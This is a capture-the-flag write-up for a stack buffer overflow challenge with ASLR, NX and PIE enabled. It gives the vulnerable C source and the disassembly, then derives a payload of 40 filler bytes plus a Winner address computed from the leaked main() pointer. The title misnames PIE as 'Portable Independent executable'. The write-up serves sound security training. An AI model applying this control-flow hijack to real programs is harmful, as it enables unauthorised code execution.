## Portable Independent executable + ASLR 
### Challenge information
- ASLR : ON
- NX : ON
- PIE : ON 
### Source Code 
```C
#include <stdio.h>
#include <stdlib.h>
 
// Instructions //
// gcc -o  chall chall.c -Wl,-z,norelro -fno-stack-protector (on the app-systeme-ch61 server for instance, but the goal is to enable NX and PIE)
 
 
void Winner() {
    printf("Access granted!\n");
    FILE *fp;
    int c;
    fp = fopen(".passwd", "r");
    if (fp == NULL)
    {
        perror("Error while opening the file.\n");
        exit(EXIT_FAILURE);
    }
    else {
        printf("Super secret flag: ");
        while ((c = getc(fp)) != EOF)
            putchar(c);
        fclose(fp);
    }
}
 
int Loser() {
    printf("Access denied!\n");
    return 0;
}
 
int main() {
    char key[30];
    printf("I'm an unbreakable safe, so you need a key to enter!\n");
     printf("Hint, main(): %p\n",main);
     printf("Key: ");
     scanf("%s", &key);
     Loser();
    return 0;
}

```
So the Goal is obvious , call Winner function somehow . <br/>
```asm
 0x000000000000091a <+0>:     push   rbp
 0x000000000000091b <+1>:     mov    rbp,rsp
 0x000000000000091e <+4>:     sub    rsp,0x20
 0x0000000000000922 <+8>:     lea    rdi,[rip+0x147]        # 0xa70
 0x0000000000000929 <+15>:    call   0x6e0 <puts@plt>
 0x000000000000092e <+20>:    lea    rsi,[rip+0xffffffffffffffe5]        # 0x91a <main>
 0x0000000000000935 <+27>:    lea    rdi,[rip+0x169]        # 0xaa5
 0x000000000000093c <+34>:    mov    eax,0x0
 0x0000000000000941 <+39>:    call   0x700 <printf@plt>
 0x0000000000000946 <+44>:    lea    rdi,[rip+0x16a]        # 0xab7
 0x000000000000094d <+51>:    mov    eax,0x0
 0x0000000000000952 <+56>:    call   0x700 <printf@plt>
 0x0000000000000957 <+61>:    lea    rax,[rbp-0x20]
 0x000000000000095b <+65>:    mov    rsi,rax
 0x000000000000095e <+68>:    lea    rdi,[rip+0x158]        # 0xabd
 0x0000000000000965 <+75>:    mov    eax,0x0
 0x000000000000096a <+80>:    call   0x740 <__isoc99_scanf@plt>
 0x000000000000096f <+85>:    mov    eax,0x0
 0x0000000000000974 <+90>:    call   0x903 <Loser>
 0x0000000000000979 <+95>:    mov    eax,0x0
 0x000000000000097e <+100>:   leave
 0x000000000000097f <+101>:   ret
```
- Looking at the disassembly of the main function shows that stack will be a 32 byte size , which means old RIP value is at ***32 + 8***
- the stack is not executable so no way for a shellcode
- Since there is an address leak of the main function we can calculate the offset from main to Winner 
```asm
   0x000000000000087a <+0>:     push   rbp
   0x000000000000087b <+1>:     mov    rbp,rsp
   0x000000000000087e <+4>:     sub    rsp,0x10
   0x0000000000000882 <+8>:     lea    rdi,[rip+0x17f]        # 0xa08
   0x0000000000000889 <+15>:    call   0x6e0 <puts@plt>
   0x000000000000088e <+20>:    lea    rsi,[rip+0x183]        # 0xa18
   0x0000000000000895 <+27>:    lea    rdi,[rip+0x17e]        # 0xa1a
   0x000000000000089c <+34>:    call   0x720 <fopen@plt>
   0x00000000000008a1 <+39>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000008a5 <+43>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000000008aa <+48>:    jne    0x8c2 <Winner+72>
   0x00000000000008ac <+50>:    lea    rdi,[rip+0x175]        # 0xa28
   0x00000000000008b3 <+57>:    call   0x730 <perror@plt>
   0x00000000000008b8 <+62>:    mov    edi,0x1
   0x00000000000008bd <+67>:    call   0x750 <exit@plt>
   0x00000000000008c2 <+72>:    lea    rdi,[rip+0x17e]        # 0xa47
   0x00000000000008c9 <+79>:    mov    eax,0x0
   0x00000000000008ce <+84>:    call   0x700 <printf@plt>
   0x00000000000008d3 <+89>:    jmp    0x8df <Winner+101>
   0x00000000000008d5 <+91>:    mov    eax,DWORD PTR [rbp-0xc]
   0x00000000000008d8 <+94>:    mov    edi,eax
   0x00000000000008da <+96>:    call   0x6d0 <putchar@plt>
   0x00000000000008df <+101>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000008e3 <+105>:   mov    rdi,rax
   0x00000000000008e6 <+108>:   call   0x710 <_IO_getc@plt>
   0x00000000000008eb <+113>:   mov    DWORD PTR [rbp-0xc],eax
   0x00000000000008ee <+116>:   cmp    DWORD PTR [rbp-0xc],0xffffffff
   0x00000000000008f2 <+120>:   jne    0x8d5 <Winner+91>
   0x00000000000008f4 <+122>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000008f8 <+126>:   mov    rdi,rax
   0x00000000000008fb <+129>:   call   0x6f0 <fclose@plt>
   0x0000000000000900 <+134>:   nop
   0x0000000000000901 <+135>:   leave
   0x0000000000000902 <+136>:   ret
```
Turns out the offset is ***Winner = main - 160***
payload will be : ***garbage_byte * 40 + offset_calculated***
